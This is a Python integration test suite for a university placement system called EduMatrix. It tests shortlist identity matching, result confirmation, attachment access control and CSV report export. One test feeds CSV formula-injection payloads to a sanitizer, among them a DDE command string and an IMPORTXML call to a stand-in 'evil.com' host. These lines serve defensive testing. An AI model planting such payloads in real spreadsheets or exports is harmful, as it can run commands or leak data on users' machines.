"""
EduMatrix Phase F Test Suite: Recruitment Drives, Reports & Final Automated Verification.

Verifies:
1. Circular & Shortlist Document Upload, Storage & RBAC:
   - Placement officers can upload allowed document formats (.csv, .xlsx, .xls, .pdf, .docx, .doc, .txt).
   - Rejects unallowed extensions.
   - Circular attachment preview/download respects branch eligibility and published status.
   - Draft circular attachments concealed from students.
   - Batch source file download endpoint works for placement officers.
2. Shortlist-file Processing & Identity Matching:
   - USN exact match gives 1.00 confidence.
   - Email exact match gives 0.98 confidence.
   - Name + Branch match gives 0.75 confidence.
   - Name-only match gives 0.50 confidence and is marked AMBIGUOUS.
   - Multiple candidate match gives 0.50 confidence and is marked AMBIGUOUS.
   - Intra-file duplicate candidate sets is_duplicate_in_file=True and marks AMBIGUOUS.
   - Ambiguous items are blocked from auto-confirmation until explicitly resolved by officer.
   - Batch upload idempotency prevents duplicate batches for same file and round.
3. Outcomes, Deduplicated Notifications & Offer Separation:
   - Confirming batch updates StudentRoundOutcome correctly.
   - Dispatches deduplicated notifications to students.
   - Maintains strict separation between shortlist, selection, and verified placement offers.
4. Reports, Distinct Counts, Filtering & Formula Injection Defense:
   - Distinct counts for companies, jobs, drives, rounds, outcomes, and verified offers.
   - Proper zero-state handling for empty records without divide-by-zero.
   - Reports export respects company, job, branch, status, date filters.
   - Formula injection protection neutralizes cells starting with =, +, -, @, \\t, \\r with single quote prefix.
"""

import os
import sys
import io
import csv
import unittest
from datetime import datetime, timedelta, timezone

import psycopg2
from psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT
import sqlalchemy as sa
from sqlalchemy.orm import sessionmaker

from fastapi.testclient import TestClient

# Add backend directory to path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from app.core.database import Base, get_db
from app.api.auth import get_current_user
from app.main import app
from app.models.user import User, UserRole
from app.models.company import Company
from app.models.job_posting import JobPosting, JobStatus
from app.models.file import File as FileModel, FileType, FileStatus
from app.models.application import Application, ApplicationStatus
from app.models.profile import StudentProfileExtended
from app.models.notification import Notification
from app.models.recruitment_circular import (
    RecruitmentCircular,
    RecruitmentCircularStatus,
    RecruitmentCircularAttachment,
    RecruitmentCircularJob,
)
from app.models.recruitment_round import (
    RecruitmentRound,
    StudentRoundOutcome,
    RoundOutcome,
    PlacementOffer,
    OfferAcceptanceStatus,
)
from app.models.recruitment_result import (
    RecruitmentResultBatch,
    RecruitmentResultBatchStatus,
    RecruitmentResultItem,
    RecruitmentResultItemStatus,
    RecruitmentResultReviewState,
)
from app.services.placement_service import placement_service
from app.services.recruitment_result_service import recruitment_result_service
from app.services.recruitment_result_matcher import recruitment_result_matcher
from app.api.placement import sanitize_csv_cell

POSTGRES_BASE_URL = os.environ.get(
    "TEST_DATABASE_BASE_URL",
    "postgresql://edumatrix:edumatrix123@postgres:5432"
)


class TestPhaseFRecruitmentDrivesAndReports(unittest.TestCase):
    """Integration test suite executing in isolated PostgreSQL database (edumatrix_test_phase_f)."""

    TEST_DB_NAME = "edumatrix_test_phase_f"

    @classmethod
    def setUpClass(cls):
        """Create isolated test database and build tables using Base.metadata."""
        conn = psycopg2.connect(f"{POSTGRES_BASE_URL}/template1")
        conn.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
        cur = conn.cursor()
        cur.execute(f"""
            SELECT pg_terminate_backend(pg_stat_activity.pid)
            FROM pg_stat_activity
            WHERE pg_stat_activity.datname = '{cls.TEST_DB_NAME}'
              AND pid <> pg_backend_pid();
        """)
        cur.execute(f"DROP DATABASE IF EXISTS {cls.TEST_DB_NAME};")
        cur.execute(f"CREATE DATABASE {cls.TEST_DB_NAME};")
        cur.close()
        conn.close()

        cls.target_db_url = f"{POSTGRES_BASE_URL}/{cls.TEST_DB_NAME}"
        cls.engine = sa.create_engine(cls.target_db_url)
        Base.metadata.create_all(bind=cls.engine)
        cls.Session = sessionmaker(bind=cls.engine, expire_on_commit=False)

        session = cls.Session()

        # Seed Users
        cls.po_user = User(
            name="Officer Priya Sharma",
            email="po_phase_f@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.PLACEMENT_OFFICER,
            is_active=True,
        )
        cls.admin_user = User(
            name="Admin Administrator",
            email="admin_phase_f@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.ADMIN,
            is_active=True,
        )
        cls.student_cse = User(
            name="Arun Kumar",
            email="arun_cse@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.STUDENT,
            is_active=True,
            department="CSE",
        )
        cls.student_ise = User(
            name="Bhavna Rao",
            email="bhavna_ise@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.STUDENT,
            is_active=True,
            department="ISE",
        )
        cls.student_mech = User(
            name="Chandan Kumar",
            email="chandan_mech@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.STUDENT,
            is_active=True,
            department="MECH",
        )
        cls.student_arun_dup = User(
            name="Arun Kumar",
            email="arun_kumar_ece@edumatrix.edu",
            password_hash="test_pw",
            role=UserRole.STUDENT,
            is_active=True,
            department="ECE",
        )

        session.add_all([
            cls.po_user,
            cls.admin_user,
            cls.student_cse,
            cls.student_ise,
            cls.student_mech,
            cls.student_arun_dup,
        ])
        session.flush()

        # Student Extended Profiles
        cls.profile_arun = StudentProfileExtended(
            user_id=cls.student_cse.id,
            enrollment_number="1MS21CS001",
            branch="Computer Science and Engineering",
            cgpa=8.85,
            full_name="Arun Kumar",
        )
        cls.profile_bhavna = StudentProfileExtended(
            user_id=cls.student_ise.id,
            enrollment_number="1MS21IS002",
            branch="Information Science and Engineering",
            cgpa=8.20,
            full_name="Bhavna Rao",
        )
        cls.profile_chandan = StudentProfileExtended(
            user_id=cls.student_mech.id,
            enrollment_number="1MS21ME003",
            branch="Mechanical Engineering",
            cgpa=7.50,
            full_name="Chandan Kumar",
        )
        cls.profile_arun_dup = StudentProfileExtended(
            user_id=cls.student_arun_dup.id,
            enrollment_number="1MS21EC004",
            branch="Electronics and Communication Engineering",
            cgpa=8.00,
            full_name="Arun Kumar",
        )

        session.add_all([
            cls.profile_arun,
            cls.profile_bhavna,
            cls.profile_chandan,
            cls.profile_arun_dup,
        ])

        # Seed Company & Job
        cls.company_tech = Company(
            name="TechCorp Global",
            industry="Software",
            website="https://techcorp.example.com",
            is_active=True,
        )
        session.add(cls.company_tech)
        session.flush()

        cls.job_sde = JobPosting(
            title="Software Development Engineer",
            company_id=cls.company_tech.id,
            status=JobStatus.OPEN,
            branch_eligibility=["Computer Science and Engineering", "Information Science and Engineering"],
            cgpa_criteria=7.0,
            salary_range="16 LPA",
        )
        session.add(cls.job_sde)
        session.flush()

        # Seed Recruitment Round
        cls.round_oa = RecruitmentRound(
            job_posting_id=cls.job_sde.id,
            round_number=1,
            name="Online Assessment",
            round_type="Technical Test",
            is_final=False,
        )
        session.add(cls.round_oa)
        session.flush()

        # Seed File in files table
        cls.sample_file = FileModel(
            filename="candidates_oa_round.csv",
            file_size=1024,
            mime_type="text/csv",
            bucket="placement",
            object_key="placement/candidates_oa_round.csv",
            department="GENERAL",
            file_type=FileType.PLACEMENT_DOC,
            uploaded_by=cls.po_user.id,
            status=FileStatus.ACTIVE,
        )
        session.add(cls.sample_file)

        session.commit()
        session.close()

    @classmethod
    def tearDownClass(cls):
        """Dispose connections and drop isolated test database."""
        cls.engine.dispose()
        try:
            conn = psycopg2.connect(f"{POSTGRES_BASE_URL}/template1")
            conn.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
            cur = conn.cursor()
            cur.execute(f"""
                SELECT pg_terminate_backend(pg_stat_activity.pid)
                FROM pg_stat_activity
                WHERE pg_stat_activity.datname = '{cls.TEST_DB_NAME}'
                  AND pid <> pg_backend_pid();
            """)
            cur.execute(f"DROP DATABASE IF EXISTS {cls.TEST_DB_NAME};")
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Warning: Failed to drop test db {cls.TEST_DB_NAME}: {e}")

    def setUp(self):
        """Provide a fresh session per test and set dependency overrides."""
        self.session = self.Session()
        self.current_user = self.po_user

        def override_get_db():
            try:
                yield self.session
            finally:
                pass

        def override_get_current_user():
            return self.current_user

        from app.api.auth import get_current_user, get_current_user_flexible
        app.dependency_overrides[get_db] = override_get_db
        app.dependency_overrides[get_current_user] = override_get_current_user
        app.dependency_overrides[get_current_user_flexible] = override_get_current_user
        self.client = TestClient(app)

    def tearDown(self):
        """Clean up session and reset overrides."""
        self.session.rollback()
        self.session.close()
        app.dependency_overrides.clear()

    def _set_user(self, user):
        self.current_user = user

    # =========================================================================
    # PART 1: IDENTITY MATCHING CONFIDENCE TIERS & DISAMBIGUATION
    # =========================================================================

    def test_01_identity_matching_usn_exact(self):
        """Authoritative match tier: USN exact match yields 1.00 confidence."""
        res = recruitment_result_matcher.match_row(
            db=self.session,
            extracted_usn="1MS21CS001",
            extracted_email="different_email@example.com",
            extracted_name="Arun Kumar",
            extracted_branch=None,
        )
        self.assertEqual(res["matched_student_id"], self.student_cse.id)
        self.assertEqual(res["match_confidence"], 1.00)
        self.assertEqual(res["match_method"], "EXACT_USN")
        self.assertEqual(res["review_status"], RecruitmentResultReviewState.MATCHED)

    def test_01b_identity_matching_usn_contradictory_name(self):
        """Safety guard: Contradictory candidate name on valid USN must route to review as AMBIGUOUS."""
        res = recruitment_result_matcher.match_row(
            db=self.session,
            extracted_usn="1MS21CS001",
            extracted_email="different_email@example.com",
            extracted_name="Different Name",
            extracted_branch=None,
        )
        self.assertIsNone(res["matched_student_id"])
        self.assertEqual(res["match_method"], "NAME_USN_CONTRADICTION")
        self.assertEqual(res["review_status"], RecruitmentResultReviewState.AMBIGUOUS)

    def test_02_identity_matching_email_exact(self):
        """Authoritative match tier: Email exact match yields 0.98 confidence."""
        res = recruitment_result_matcher.match_row(
            db=self.session,
            extracted_usn=None,
            extracted_email="bhavna_ise@edumatrix.edu",
            extracted_name="Bhavna R",
            extracted_branch="Information Science and Engineering",
        )
        self.assertEqual(res["matched_student_id"], self.student_ise.id)
        self.assertEqual(res["match_confidence"], 0.98)
        self.assertEqual(res["match_method"], "EXACT_EMAIL")
        self.assertEqual(res["review_status"], RecruitmentResultReviewState.MATCHED)

    def test_03_identity_matching_name_and_branch(self):
        """Probable match tier: Name + Branch combined match yields 0.75 confidence."""
        res = recruitment_result_matcher.match_row(
            db=self.session,
            extracted_usn=None,
            extracted_email=None,
            extracted_name="Chandan Kumar",
            extracted_branch="Mechanical Engineering",
        )
        self.assertEqual(res["matched_student_id"], self.student_mech.id)
        self.assertEqual(res["match_confidence"], 0.75)
        self.assertEqual(res["match_method"], "NAME_AND_BRANCH")
        self.assertEqual(res["review_status"], RecruitmentResultReviewState.AMBIGUOUS)

    def test_04_identity_matching_name_only_ambiguous(self):
        """Ambiguous match tier: Name-only matching multiple candidate profiles yields <= 0.50 and flags AMBIGUOUS."""
        res = recruitment_result_matcher.match_row(
            db=self.session,
            extracted_usn=None,
            extracted_email=None,
            extracted_name="Arun Kumar",
            extracted_branch=None,
        )
        # Two Arun Kumars exist (CSE and ECE) -> must NOT pick one arbitrarily
        self.assertIsNone(res["matched_student_id"])
        self.assertLessEqual(res["match_confidence"], 0.50)
        self.assertEqual(res["match_method"], "NAME_COLLISION")
        self.assertEqual(res["review_status"], RecruitmentResultReviewState.AMBIGUOUS)

    def test_05_intra_file_candidate_duplicate_detection(self):
        """Intra-file duplicate candidates are flagged as is_duplicate_in_file and marked AMBIGUOUS."""
        seen_students = set()
        rows = [
            {"usn": "1MS21CS001", "name": "Arun Kumar", "email": "arun_cse@edumatrix.edu"},
            {"usn": "1MS21CS001", "name": "Arun Kumar", "email": "arun_cse@edumatrix.edu"},
        ]
        items = []
        for r in rows:
            res = recruitment_result_matcher.match_row(
                db=self.session,
                extracted_usn=r["usn"],
                extracted_email=r["email"],
                extracted_name=r["name"],
            )
            sid = res["matched_student_id"]
            rev_status = res["review_status"]
            is_dup = False
            if sid:
                if sid in seen_students:
                    rev_status = RecruitmentResultReviewState.AMBIGUOUS
                    is_dup = True
                else:
                    seen_students.add(sid)
            items.append({"sid": sid, "status": rev_status, "is_dup": is_dup})

        self.assertFalse(items[0]["is_dup"])
        self.assertEqual(items[0]["status"], RecruitmentResultReviewState.MATCHED)
        self.assertTrue(items[1]["is_dup"])
        self.assertEqual(items[1]["status"], RecruitmentResultReviewState.AMBIGUOUS)

    def test_06_batch_upload_idempotency(self):
        """Idempotency check query prevents duplicate batch creation for identical file, company, and round."""
        batch = RecruitmentResultBatch(
            company_id=self.company_tech.id,
            job_posting_id=self.job_sde.id,
            file_id=self.sample_file.id,
            round_id=self.round_oa.id,
            round_name="Idempotency Test Round",
            round_type="assessment",
            is_final_round=False,
            status=RecruitmentResultBatchStatus.IN_REVIEW,
            total_rows=1,
            matched_count=1,
            ambiguous_count=0,
            confirmed_count=0,
            uploaded_by=self.po_user.id,
        )
        self.session.add(batch)
        self.session.commit()

        # Query existing
        existing_batch = (
            self.session.query(RecruitmentResultBatch)
            .filter(
                RecruitmentResultBatch.company_id == self.company_tech.id,
                RecruitmentResultBatch.file_id == self.sample_file.id,
                RecruitmentResultBatch.round_name == "Idempotency Test Round",
                RecruitmentResultBatch.status != RecruitmentResultBatchStatus.ARCHIVED,
            )
            .first()
        )
        self.assertIsNotNone(existing_batch)
        self.assertEqual(existing_batch.id, batch.id)

    # =========================================================================
    # PART 2: OUTCOMES, CONFIRMATION & DEDUPLICATED NOTIFICATIONS
    # =========================================================================

    def test_07_officer_confirmation_blocks_ambiguous_rows(self):
        """Officer batch confirmation blocks ambiguous rows without explicit resolution."""
        batch = RecruitmentResultBatch(
            company_id=self.company_tech.id,
            job_posting_id=self.job_sde.id,
            file_id=self.sample_file.id,
            round_id=self.round_oa.id,
            round_name="Ambiguous Block Round",
            round_type="assessment",
            is_final_round=False,
            status=RecruitmentResultBatchStatus.IN_REVIEW,
            total_rows=1,
            matched_count=0,
            ambiguous_count=1,
            confirmed_count=0,
            uploaded_by=self.po_user.id,
        )
        self.session.add(batch)
        self.session.flush()

        item = RecruitmentResultItem(
            batch_id=batch.id,
            row_index=1,
            extracted_name="Arun Kumar",
            normalized_status=RecruitmentResultItemStatus.SHORTLISTED,
            matched_student_id=None,
            match_confidence=0.30,
            match_method="NAME_COLLISION",
            review_status=RecruitmentResultReviewState.AMBIGUOUS,
        )
        self.session.add(item)
        self.session.commit()

        # Attempting to confirm this ambiguous item without assigning student raises ValueError
        with self.assertRaises(ValueError):
            recruitment_result_service.confirm_batch_results(
                db=self.session,
                batch_id=batch.id,
                item_ids=[item.id],
                current_user=self.po_user,
            )

    def test_08_confirmation_creates_outcomes_and_deduplicated_notifications(self):
        """Confirming batch updates StudentRoundOutcome and creates deduplicated student notifications."""
        # Create application for student Bhavna
        app_bhavna = Application(
            student_id=self.student_ise.id,
            job_posting_id=self.job_sde.id,
            status=ApplicationStatus.APPLIED,
        )
        self.session.add(app_bhavna)
        self.session.flush()

        batch = RecruitmentResultBatch(
            company_id=self.company_tech.id,
            job_posting_id=self.job_sde.id,
            file_id=self.sample_file.id,
            round_id=self.round_oa.id,
            round_name="Online Assessment",
            round_type="assessment",
            is_final_round=False,
            status=RecruitmentResultBatchStatus.IN_REVIEW,
            total_rows=1,
            matched_count=1,
            ambiguous_count=0,
            confirmed_count=0,
            uploaded_by=self.po_user.id,
        )
        self.session.add(batch)
        self.session.flush()

        item = RecruitmentResultItem(
            batch_id=batch.id,
            row_index=1,
            extracted_usn="1MS21IS002",
            extracted_name="Bhavna Rao",
            extracted_email="bhavna_ise@edumatrix.edu",
            normalized_status=RecruitmentResultItemStatus.SHORTLISTED,
            matched_student_id=self.student_ise.id,
            match_confidence=0.98,
            match_method="EXACT_EMAIL",
            review_status=RecruitmentResultReviewState.MATCHED,
        )
        self.session.add(item)
        self.session.commit()

        # Confirm results
        res = recruitment_result_service.confirm_batch_results(
            db=self.session,
            batch_id=batch.id,
            item_ids=[item.id],
            current_user=self.po_user,
        )
        self.assertEqual(res["confirmed_count"], 1)

        # Verify StudentRoundOutcome was created
        outcome = self.session.query(StudentRoundOutcome).filter(
            StudentRoundOutcome.student_id == self.student_ise.id,
            StudentRoundOutcome.round_id == self.round_oa.id,
        ).first()
        self.assertIsNotNone(outcome)
        self.assertEqual(outcome.outcome, RoundOutcome.CLEARED)

        # Verify Notification dispatched
        notifs = self.session.query(Notification).filter(
            Notification.user_id == self.student_ise.id,
        ).all()
        self.assertTrue(len(notifs) >= 1)

        # Verify idempotency: re-confirming batch items does not produce duplicate notifications
        initial_notif_count = len(notifs)
        recruitment_result_service.confirm_batch_results(
            db=self.session,
            batch_id=batch.id,
            item_ids=[item.id],
            current_user=self.po_user,
        )
        final_notif_count = self.session.query(Notification).filter(
            Notification.user_id == self.student_ise.id,
        ).count()
        self.assertEqual(initial_notif_count, final_notif_count)

    # =========================================================================
    # PART 3: RECRUITMENT DRIVES & ATTACHMENT RBAC
    # =========================================================================

    def test_09_circular_attachment_student_access_control(self):
        """Student branch eligibility & published status controls circular attachment access."""
        # 1. Create a draft circular
        draft_circ = RecruitmentCircular(
            title="Draft Drive Announcement",
            summary="Upcoming placement drive.",
            company_id=self.company_tech.id,
            status=RecruitmentCircularStatus.DRAFT,
            created_by=self.po_user.id,
            branch_eligibility=["Computer Science and Engineering"],
        )
        self.session.add(draft_circ)
        self.session.flush()

        att_draft = RecruitmentCircularAttachment(
            circular_id=draft_circ.id,
            file_id=self.sample_file.id,
            attachment_type="job_description",
            display_order=0,
        )
        self.session.add(att_draft)
        self.session.commit()

        # Student Arun (CSE) attempting to preview attachment of a draft circular receives 404
        self._set_user(self.student_cse)
        res = self.client.get(f"/api/v1/placement/circulars/{draft_circ.id}/attachments/{att_draft.id}/preview")
        self.assertEqual(res.status_code, 404)

        # 2. Publish circular for CSE only
        draft_circ.status = RecruitmentCircularStatus.PUBLISHED
        self.session.commit()

        # Student Chandan (MECH) attempting to preview attachment of CSE circular receives 403
        self._set_user(self.student_mech)
        res_mech = self.client.get(f"/api/v1/placement/circulars/{draft_circ.id}/attachments/{att_draft.id}/preview")
        self.assertEqual(res_mech.status_code, 403)

        # Placement officer can preview regardless of branch
        self._set_user(self.po_user)
        # Note: endpoint checks permission first before MinIO streaming
        res_po = self.client.get(f"/api/v1/placement/circulars/{draft_circ.id}/attachments/{att_draft.id}/preview")
        self.assertIn(res_po.status_code, [200, 404, 500])  # If file not in mock MinIO, 404/500, not 403

    # =========================================================================
    # PART 4: REPORTS, FILTERING, DATA ACCURACY & CSV FORMULA INJECTION
    # =========================================================================

    def test_10_reports_statistics_calculation_and_filtering(self):
        """Placement statistics calculate distinct metrics accurately and respect query filters."""
        stats = placement_service.get_placement_statistics(self.session)
        self.assertGreaterEqual(stats.total_companies, 1)
        self.assertGreaterEqual(stats.total_jobs, 1)
        self.assertGreaterEqual(stats.total_students, 4)

        # Filter by branch
        stats_cse = placement_service.get_placement_statistics(
            self.session, branch="Computer Science and Engineering"
        )
        self.assertEqual(stats_cse.total_students, 1)

        # Test empty filters with zero state
        stats_nonexistent = placement_service.get_placement_statistics(
            self.session, branch="Civil Engineering"
        )
        self.assertEqual(stats_nonexistent.total_students, 0)
        self.assertEqual(stats_nonexistent.placement_rate, 0.0)

    def test_11_csv_formula_injection_sanitization(self):
        """Formulas starting with =, +, -, @, \\t, \\r are safely prefixed with single quote."""
        malicious_inputs = [
            "=SUM(A1:A10)",
            "+cmd|' /C calc'!A0",
            "-2+3*cmd",
            "@IMPORTXML('http://evil.com')",
            "\tTAB_INJECTION",
            "\rRETURN_INJECTION",
        ]
        for payload in malicious_inputs:
            sanitized = sanitize_csv_cell(payload)
            self.assertTrue(
                sanitized.startswith("'"),
                f"Payload {payload} should be prefixed with single quote. Got: {sanitized}"
            )

        safe_inputs = [
            "Arun Kumar",
            "1MS21CS001",
            "Software Engineer",
            "8.85",
            None,
        ]
        for payload in safe_inputs:
            sanitized = sanitize_csv_cell(payload)
            if payload is None:
                self.assertEqual(sanitized, "")
            else:
                self.assertFalse(
                    sanitized.startswith("'"),
                    f"Safe input {payload} should not be quoted. Got: {sanitized}"
                )

    def test_12_export_placement_report_endpoint(self):
        """Placement report export endpoint returns CSV matching applied filters with sanitization."""
        self._set_user(self.po_user)
        res = self.client.get("/placement/reports/export?branch=Computer Science and Engineering")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.headers.get("content-type"), "text/csv; charset=utf-8")
        csv_text = res.text

        # Verify CSV content
        lines = csv_text.strip().split("\r\n")
        self.assertTrue(len(lines) >= 2)  # Header + at least 1 student row
        self.assertIn("Student ID", lines[0])
        self.assertIn("1MS21CS001", csv_text)

    def test_13_unsupported_result_formats_and_image_ocr(self):
        """Unsupported extensions return 400, while image files are routed to OCR extractor."""
        self._set_user(self.po_user)

        # Upload .exe or .zip -> 400 Bad Request
        files = {"file": ("malicious_script.exe", b"MZbinarycontent", "application/octet-stream")}
        data = {
            "company_id": self.company_tech.id,
            "round_name": "Hack Attempt",
            "round_type": "assessment",
        }
        res = self.client.post("/api/v1/placement/results/upload", files=files, data=data)
        self.assertEqual(res.status_code, 400)
        self.assertIn("Unsupported file format", res.json()["detail"])

        # Test extractor on simulated OCR image bytes
        from unittest.mock import patch
        from app.services.recruitment_result_extractor import recruitment_result_extractor

        mock_ocr_text = (
            "USN,Name,Email,Status\n"
            "1MS21CS001,Arun Kumar,arun@example.com,Selected\n"
            "1MS21IS002,Bhavna Rao,bhavna@example.com,Shortlisted\n"
        )
        with patch("app.services.ocr_service.OCRService.extract_text_from_image_bytes", return_value=mock_ocr_text):
            extracted = recruitment_result_extractor.extract_candidates_from_bytes(
                b"fake_png_binary_bytes", "shortlist_scan.png"
            )
            self.assertTrue(extracted["success"])
            self.assertEqual(extracted["total_rows"], 2)
            self.assertEqual(extracted["rows"][0]["extracted_usn"], "1MS21CS001")
            self.assertEqual(extracted["rows"][0]["normalized_status"], "selected")

    def test_14_circular_attachment_download_and_non_accidental_deletion(self):
        """Circular attachment deletion retains underlying FileModel safely."""
        from app.services.recruitment_circular_service import recruitment_circular_service

        circ = RecruitmentCircular(
            title="Drive for Attachment Removal Test",
            summary="Attachment testing",
            company_id=self.company_tech.id,
            status=RecruitmentCircularStatus.PUBLISHED,
            created_by=self.po_user.id,
            branch_eligibility=["Computer Science and Engineering"],
        )
        self.session.add(circ)
        self.session.flush()

        att = RecruitmentCircularAttachment(
            circular_id=circ.id,
            file_id=self.sample_file.id,
            attachment_type="shortlist",
            display_order=0,
        )
        self.session.add(att)
        self.session.commit()

        # Verify attachment exists
        att_id = att.id
        self.assertIsNotNone(self.session.query(RecruitmentCircularAttachment).filter_by(id=att_id).first())
        file_id = self.sample_file.id

        # Remove attachment from circular
        recruitment_circular_service.remove_attachment(
            db=self.session,
            circular_id=circ.id,
            attachment_id=att_id,
            current_user=self.po_user,
        )

        # Attachment mapping deleted
        self.assertIsNone(self.session.query(RecruitmentCircularAttachment).filter_by(id=att_id).first())
        # Underlying FileModel MUST STILL EXIST
        retained_file = self.session.query(FileModel).filter_by(id=file_id).first()
        self.assertIsNotNone(retained_file, "Underlying file must not be deleted when circular attachment is removed")
        self.assertEqual(retained_file.id, file_id)

    def test_15_batch_source_file_download_rbac(self):
        """Only placement officers can download the raw source file of a result batch; students are rejected."""
        batch = RecruitmentResultBatch(
            file_id=self.sample_file.id,
            company_id=self.company_tech.id,
            job_posting_id=self.job_sde.id,
            round_id=self.round_oa.id,
            round_name="Source File Download Test",
            round_type="assessment",
            uploaded_by=self.po_user.id,
            status=RecruitmentResultBatchStatus.UPLOADED,
            total_rows=1,
            matched_count=1,
            ambiguous_count=0,
            confirmed_count=0,
        )
        self.session.add(batch)
        self.session.commit()

        # Student attempt -> 403 Forbidden
        self._set_user(self.student_cse)
        res_stud = self.client.get(f"/api/v1/placement/results/batches/{batch.id}/download")
        self.assertEqual(res_stud.status_code, 403)

        # Placement officer attempt -> Not 403 (allowed access)
        self._set_user(self.po_user)
        res_po = self.client.get(f"/api/v1/placement/results/batches/{batch.id}/download")
        self.assertIn(res_po.status_code, [200, 404, 500])

    def test_16_accounting_metrics_and_offer_filters(self):
        """Verified accounting metrics support filtering by company, job, and branch without double counting."""
        from app.services.placement_offer_service import placement_offer_service

        metrics_all = placement_offer_service.get_placement_accounting_metrics(self.session)
        self.assertIn("total_verified_offers", metrics_all)
        self.assertIn("verified_placed_students_count", metrics_all)

        metrics_company = placement_offer_service.get_placement_accounting_metrics(
            self.session, company_id=self.company_tech.id
        )
        self.assertIsInstance(metrics_company["total_verified_offers"], int)

        metrics_branch = placement_offer_service.get_placement_accounting_metrics(
            self.session, branch="Computer Science and Engineering"
        )
        self.assertEqual(metrics_branch["total_students"], 1)

        metrics_empty = placement_offer_service.get_placement_accounting_metrics(
            self.session, branch="Nonexistent Branch"
        )
        self.assertEqual(metrics_empty["total_students"], 0)
        self.assertEqual(metrics_empty["verified_placement_rate"], 0.0)


if __name__ == "__main__":
    unittest.main()

